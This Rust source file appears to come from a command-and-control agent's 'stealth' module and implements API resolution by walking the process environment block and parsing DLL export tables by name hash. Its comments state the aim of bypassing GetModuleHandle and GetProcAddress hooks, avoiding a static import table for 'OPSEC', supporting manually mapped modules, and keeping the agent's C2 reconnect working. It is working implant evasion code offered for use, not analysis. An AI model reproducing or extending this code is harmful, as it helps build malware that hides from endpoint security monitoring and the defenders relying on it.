// Client/core/src/stealth/peb.rs
// Position Independent API Resolution via PEB Walking
//
// Architecture-agnostic caches (x86 + x64):
// - Module bases for hot DLLs (ntdll/kernel32/kernelbase)
// - Export address cache keyed by (module_base, func_hash)

use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::OnceLock;

use super::hash_module_name;
#[cfg(target_arch = "x86")]
use winapi::um::winnt::IMAGE_NT_HEADERS32 as IMAGE_NT_HEADERS;
#[cfg(target_arch = "x86_64")]
use winapi::um::winnt::IMAGE_NT_HEADERS64 as IMAGE_NT_HEADERS;
use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY};

/// Hot-path module base cache (atomic; 0 = unresolved). Arch-independent.
struct ModuleBaseCache {
    ntdll: AtomicUsize,
    kernel32: AtomicUsize,
    kernelbase: AtomicUsize,
}

fn module_cache() -> &'static ModuleBaseCache {
    static CACHE: OnceLock<ModuleBaseCache> = OnceLock::new();
    CACHE.get_or_init(|| ModuleBaseCache {
        ntdll: AtomicUsize::new(0),
        kernel32: AtomicUsize::new(0),
        kernelbase: AtomicUsize::new(0),
    })
}

// ────────────────────────────────────────────────────────────────────────────
// Export resolve cache: (module_base, name_hash) → VA.
//
// Direct-mapped ATOMIC SLOTS — deliberately NOT std Mutex<HashMap>:
// std's HashMap default hasher (`RandomState::new`) touches a `thread_local`
// (hash/random.rs: `thread_local!(static KEYS: Cell<(u64,u64)> ...)`) which
// ACCESS-VIOLATES inside Manual-Mapped L2 modules once pe_map neuters the TLS
// directory (TLS_SENTINEL_INDEX = 0x7FFFFFFF → gs:[0x58] walk → 0xC0000005).
// The atomic-slot design is TLS-free, allocation-free and lock-free; a slot
// collision degrades to a cache miss (correct, just re-walks the export dir).
// ────────────────────────────────────────────────────────────────────────────

/// Export cache slots (direct-mapped by func hash).
const EXPORT_CACHE_SLOTS: usize = 64;

/// One cache entry: tag = (module, hash) validated before returning addr.
struct ExportCacheSlot {
    m: AtomicUsize,
    h: AtomicUsize,
    addr: AtomicUsize,
}

static EXPORT_CACHE: [ExportCacheSlot; EXPORT_CACHE_SLOTS] = {
    const EMPTY: ExportCacheSlot = ExportCacheSlot {
        m: AtomicUsize::new(0),
        h: AtomicUsize::new(0),
        addr: AtomicUsize::new(0),
    };
    [EMPTY; EXPORT_CACHE_SLOTS]
};

#[inline]
fn export_cache_get(module: usize, hash: u32) -> Option<usize> {
    crate::tracef_g(&format!("cache: get m=0x{:X} h=0x{:X}", module, hash));
    let slot = &EXPORT_CACHE[(hash as usize) % EXPORT_CACHE_SLOTS];
    if slot.m.load(Ordering::Acquire) == module && slot.h.load(Ordering::Acquire) == hash as usize
    {
        let a = slot.addr.load(Ordering::Acquire);
        if a != 0 {
            crate::tracef_g(&format!("cache: got Some(0x{:X})", a));
            return Some(a);
        }
    }
    crate::tracef_g("cache: got None");
    None
}

#[inline]
fn export_cache_put(module: usize, hash: u32, addr: usize) {
    let slot = &EXPORT_CACHE[(hash as usize) % EXPORT_CACHE_SLOTS];
    // addr first, tag last → readers see a validated entry (Release/Acquire).
    slot.addr.store(addr, Ordering::Release);
    slot.m.store(module, Ordering::Release);
    slot.h.store(hash as usize, Ordering::Release);
}

#[inline]
fn cached_slot_for(name_hash: u32) -> Option<&'static AtomicUsize> {
    let c = module_cache();
    if name_hash == hash_module_name(b"ntdll.dll") {
        Some(&c.ntdll)
    } else if name_hash == hash_module_name(b"kernel32.dll") {
        Some(&c.kernel32)
    } else if name_hash == hash_module_name(b"kernelbase.dll") {
        Some(&c.kernelbase)
    } else {
        None
    }
}

/// PEB Walking: Returns the base address of a loaded module by its name hash.
/// Completely bypasses GetModuleHandle hooking.
/// Hot modules (ntdll/kernel32/kernelbase) are cached after first resolution.
#[cfg(windows)]
pub unsafe fn get_module_base(name_hash: u32) -> usize {
    if let Some(slot) = cached_slot_for(name_hash) {
        let cached = slot.load(Ordering::Acquire);
        if cached != 0 {
            return cached;
        }
    }

    let base = get_module_base_uncached(name_hash);
    if base != 0 {
        if let Some(slot) = cached_slot_for(name_hash) {
            slot.store(base, Ordering::Release);
        }
    }
    base
}

#[cfg(windows)]
unsafe fn get_module_base_uncached(name_hash: u32) -> usize {
    #[repr(C)]
    struct UNICODE_STRING {
        length: u16,
        maximum_length: u16,
        buffer: *mut u16,
    }

    #[repr(C)]
    struct LDR_DATA_TABLE_ENTRY {
        in_load_order_links: winapi::shared::ntdef::LIST_ENTRY,
        in_memory_order_links: winapi::shared::ntdef::LIST_ENTRY,
        in_initialization_order_links: winapi::shared::ntdef::LIST_ENTRY,
        dll_base: *mut winapi::ctypes::c_void,
        entry_point: *mut winapi::ctypes::c_void,
        size_of_image: u32,
        full_dll_name: UNICODE_STRING,
        base_dll_name: UNICODE_STRING,
    }

    let peb: *const usize;
    #[cfg(target_arch = "x86_64")]
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    #[cfg(target_arch = "x86")]
    std::arch::asm!("mov {}, fs:[0x30]", out(reg) peb);

    // Ldr = PEB + 0x18 (x64) or + 0x0c (x86)
    let ldr = *(peb.add(3) as *const *const usize);

    // InMemoryOrderModuleList head is Ldr + 0x20 (x64) or + 0x14 (x86)
    let list_head = if cfg!(target_arch = "x86_64") {
        ldr.add(4)
    } else {
        ldr.add(5)
    } as *mut winapi::shared::ntdef::LIST_ENTRY;
    let mut current_node = (*list_head).Flink;

    // NOTE: Do NOT call db_print / format! here.
    // Release db_print re-enters get_module_base for OutputDebugStringA; combined with
    // Once::call_once that caused deadlock → agent freeze, no C2 reconnect.

    while current_node != list_head {
        let entry_ptr = if cfg!(target_arch = "x86_64") {
            (current_node as *const u8).sub(16)
        } else {
            (current_node as *const u8).sub(8)
        };

        let entry = entry_ptr as *const LDR_DATA_TABLE_ENTRY;
        let buffer = (*entry).base_dll_name.buffer;
        let len = (*entry).base_dll_name.length as usize / 2;

        if !buffer.is_null() && len > 0 {
            let name = std::slice::from_raw_parts(buffer, len);
            let mut h: u32 = 0;
            for &c in name {
                let lower = if c >= b'A' as u16 && c <= b'Z' as u16 {
                    c + 32
                } else {
                    c
                };
                h = h.wrapping_mul(31).wrapping_add(lower as u32);
            }

            if h == name_hash {
                return (*entry).dll_base as usize;
            }
        }

        current_node = (*current_node).Flink;
    }

    0
}

/// Resolve module base: PEB first; if not loaded, `LoadLibraryA` via kernel32 then re-walk PEB.
///
/// Console agents often have **no user32/gdi32/gdiplus** until first GUI use — pure PEB
/// returns 0 and callers fail cleanly. This is the correct OPSEC-friendly load path
/// (still no static IAT for those DLLs).
///
/// `dll_name` must be ASCII like `b"user32.dll"` (NUL appended if missing).
#[cfg(windows)]
pub unsafe fn ensure_module_base(dll_name: &[u8], name_hash: u32) -> usize {
    let existing = get_module_base(name_hash);
    if existing != 0 {
        return existing;
    }

    let k32 = get_module_base(super::hash_module_name(b"kernel32.dll"));
    if k32 == 0 {
        return 0;
    }
    let load_addr = match get_api_addr(k32, super::hash_api_name(b"LoadLibraryA")) {
        Some(a) => a,
        None => return 0,
    };
    type LoadLibraryAFn = unsafe extern "system" fn(*const i8) -> usize;
    let load_library: LoadLibraryAFn = std::mem::transmute(load_addr);

    let mut name = Vec::with_capacity(dll_name.len() + 1);
    name.extend_from_slice(dll_name);
    if !name.ends_with(&[0]) {
        name.push(0);
    }
    let h = load_library(name.as_ptr() as *const i8);
    if h == 0 {
        return 0;
    }
    // Re-walk PEB so subsequent get_module_base hits the loaded module
    let again = get_module_base(name_hash);
    if again != 0 {
        again
    } else {
        h
    }
}

/// Dynamic Export Parsing: Find function address by name hash.
/// Completely bypasses GetProcAddress hooking.
/// Results cached (arch-independent) after first successful resolve.
#[cfg(windows)]
pub unsafe fn get_api_addr(module_ptr: usize, func_hash: u32) -> Option<usize> {
    crate::tracef_g(&format!("apiaddr: enter m=0x{:X} h=0x{:X}", module_ptr, func_hash));
    if module_ptr == 0 {
        crate::tracef_g("apiaddr: zero module");
        return None;
    }
    if let Some(cached) = export_cache_get(module_ptr, func_hash) {
        crate::tracef_g("apiaddr: cache HIT");
        return Some(cached);
    }
    crate::tracef_g("apiaddr: cache miss -> walk");
    let addr = get_api_addr_uncached(module_ptr, func_hash)?;
    export_cache_put(module_ptr, func_hash, addr);
    Some(addr)
}

#[cfg(windows)]
unsafe fn get_api_addr_uncached(module_ptr: usize, func_hash: u32) -> Option<usize> {
    crate::tracef_g(&format!("apiwalk: enter m=0x{:X} h=0x{:X}", module_ptr, func_hash));
    let dos_header = module_ptr as *const IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != 0x5A4D {
        return None;
    }

    let nt_headers = (module_ptr + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
    let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress as usize;
    if export_dir_rva == 0 {
        return None;
    }

    let export_dir = (module_ptr + export_dir_rva) as *const IMAGE_EXPORT_DIRECTORY;
    let names = (module_ptr + (*export_dir).AddressOfNames as usize) as *const u32;
    let ordinals = (module_ptr + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;
    let functions = (module_ptr + (*export_dir).AddressOfFunctions as usize) as *const u32;
    crate::tracef_g(&format!(
        "apiwalk: dir names={} fns={}",
        (*export_dir).NumberOfNames, (*export_dir).NumberOfFunctions
    ));

    for i in 0..(*export_dir).NumberOfNames {
        if i % 256 == 0 {
            crate::tracef_g(&format!("apiwalk: i={}", i));
        }
        let name_ptr = (module_ptr + *names.add(i as usize) as usize) as *const i8;
        let mut h: u32 = 0;
        let mut offset = 0;
        while *name_ptr.add(offset) != 0 {
            h = h
                .wrapping_mul(31)
                .wrapping_add(*name_ptr.add(offset) as u8 as u32);
            offset += 1;
        }

        if h == func_hash {
            crate::tracef_g(&format!("apiwalk: MATCH at i={}", i));
            let ordinal = *ordinals.add(i as usize);
            let func_rva = *functions.add(ordinal as usize) as usize;

            // Export forwarding
            let export_dir_size = (*nt_headers).OptionalHeader.DataDirectory[0].Size as usize;
            if func_rva >= export_dir_rva && func_rva < export_dir_rva + export_dir_size {
                let forwarder_name_ptr = (module_ptr + func_rva) as *const i8;
                let mut forwarder_name = [0u8; 256];
                let mut j = 0;
                while *forwarder_name_ptr.add(j) != 0 && j < 255 {
                    forwarder_name[j] = *forwarder_name_ptr.add(j) as u8;
                    j += 1;
                }

                let s = std::str::from_utf8(&forwarder_name[..j]).ok()?;
                let p: Vec<&str> = s.split('.').collect();
                if p.len() == 2 {
                    let dll_base_name = p[0].to_lowercase();
                    let mut dll = dll_base_name.clone();
                    if !dll.ends_with(".dll") {
                        dll.push_str(".dll");
                    }

                    let mut h_dll: u32 = 0;
                    for b in dll.bytes() {
                        let lower = if b >= b'A' && b <= b'Z' { b + 32 } else { b };
                        h_dll = h_dll.wrapping_mul(31).wrapping_add(lower as u32);
                    }

                    let mut target_mod = get_module_base(h_dll);

                    // Fallback for API Sets
                    if target_mod == 0
                        && (dll_base_name.starts_with("api-ms-")
                            || dll_base_name.starts_with("ext-ms-"))
                    {
                        target_mod = get_module_base(hash_module_name(b"kernelbase.dll"));
                    }

                    if target_mod != 0 {
                        let mut h_func: u32 = 0;
                        for b in p[1].bytes() {
                            h_func = h_func.wrapping_mul(31).wrapping_add(b as u32);
                        }
                        return get_api_addr(target_mod, h_func);
                    }
                }
                return None;
            }

            return Some(module_ptr + func_rva);
        }
    }
    crate::tracef_g("apiwalk: no match");
    None
}
